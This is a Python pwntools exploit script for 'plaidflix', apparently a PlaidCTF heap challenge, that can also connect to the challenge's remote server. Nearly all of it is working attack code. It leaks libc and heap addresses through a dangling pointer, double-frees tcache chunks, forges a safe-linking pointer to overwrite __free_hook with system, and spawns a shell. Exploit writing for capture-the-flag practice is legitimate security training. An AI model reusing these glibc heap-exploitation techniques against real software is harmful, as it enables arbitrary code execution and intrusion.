#!/usr/bin/env python3

from pwn import *

the_binary = "./bin/plaidflix"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc-2.32.so", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("plaidflix.pwni.ng", 1337)
elif args.STRACE:
    io = process(["strace", "-o" ,"strace.txt", the_binary])
elif args.LTRACE:
    io = process(["ltrace", "-o", "ltrace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

def send(data):
    io.sendlineafter("> ", data)

def send_num(num):
    send(str(num))

def menu(*nums):
    for num in nums:
        send_num(num)

def add_movie(title, rating):
    menu(0, 0)
    send(title)
    send_num(rating)

def remove_movie(idx):
    menu(0, 1)
    send_num(idx)

def show_movies():
    menu(0, 2)

def share_movie(movie_idx, friend_idx):
    menu(0, 3)
    send_num(movie_idx)
    send_num(friend_idx)

def add_friend(name):
    menu(1, 0)
    send_num(len(name))
    send(name)

def remove_friend(idx):
    menu(1, 1)
    send_num(idx)

def show_friends():
    menu(1, 2)

def add_feedback(data):
    menu(0)
    send(data)

def delete_feedback(idx):
    menu(1)
    send_num(idx)

def add_contact_details(data):
    menu(2)
    send(data)

def consolidate():
    send("0"*0x1024 + "9")

def leak():
    show_movies()
    io.recvuntil("Shared with: ")
    raw_leak = io.recvuntil(b"\n", drop=True)
    return u64(raw_leak.ljust(8, b"\x00"))

class Constants:
    max_friend_name_len = 0x90 - 1
    max_num_movies = 7
    max_num_friends = 8
    max_feedbacks = 10

# Name.
send("x"*0x64)

for i in range(Constants.max_num_movies):
    add_movie(f"movie_{i}", 5)
for i in range(Constants.max_num_movies):
    remove_movie(i)

# Prevent consolidation with top chunk.
add_friend("A"*0x10)
remove_friend(0)

consolidate()

for i in range(Constants.max_num_friends):
    add_friend(chr(i+0x41)*Constants.max_friend_name_len)

add_movie("0"*0x10, 5)
share_movie(0, 0)

for i in reversed(range(Constants.max_num_friends)):
    remove_friend(i)
consolidate()

# Libc leak from dangling pointer.
libc_leak = leak()
libc.address = libc_leak - 0x1e3c90
log.info("libc leak: %#x" % libc_leak)
log.info("libc base: %#x" % libc.address)

for i in range(Constants.max_num_friends):
    add_friend(chr(i+0x41)*Constants.max_friend_name_len)
for i in reversed(range(Constants.max_num_friends)):
    remove_friend(i)
consolidate()
heap_leak = leak()
heap_base = heap_leak << 12
log.info("heap leak: %#x" % heap_leak)
log.info("heap base: %#x" % heap_base)

# We can double free pointers in the feedback functionality when deleting our
# account. To do so, we have to enter the account deletion functionality, at
# which point we can't return to the original menu.
menu(2)
send("y")

for i in range(Constants.max_feedbacks):
    add_feedback(str(i)*0x10)
for i in reversed(range(Constants.max_feedbacks-1)):
    delete_feedback(i)

# Create a vacancy in the 0x110 tcache list.
add_feedback("/bin/sh\x00")

# Free the forged chunk.
delete_feedback(1)

# This request will be serviced by a consolidated combination of previous 0x110
# chunks. Due to this chunk's larger size, we can overwrite metadata of one
# of the 0x110 chunks that remains in use.
fake_fd_pointer = ((heap_base + 0xbf0) >> 12) ^ libc.sym.__free_hook
fake_chunk = p64(0x110) + p64(0x111) + p64(fake_fd_pointer)
add_contact_details(b"A"*0x100 + fake_chunk)

# Allocate until we get a chunk placed over __free_hook.
add_feedback("B"*0x10)
add_feedback(p64(libc.sym.system))

# Trigger __free_hook.
delete_feedback(0)

io.interactive()
